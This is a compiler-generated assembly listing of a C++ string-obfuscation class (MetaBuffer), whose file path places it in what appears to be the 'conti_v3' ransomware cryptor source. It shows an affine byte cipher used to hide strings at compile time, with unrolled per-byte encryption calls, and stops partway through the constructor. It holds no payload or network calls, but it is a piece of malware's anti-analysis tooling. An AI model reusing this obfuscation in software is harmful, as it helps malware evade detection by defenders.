?decrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEBA_NXZ PROC ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv350 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0L@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@AEBAEE@Z ; MetaBuffer<11,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::encrypt
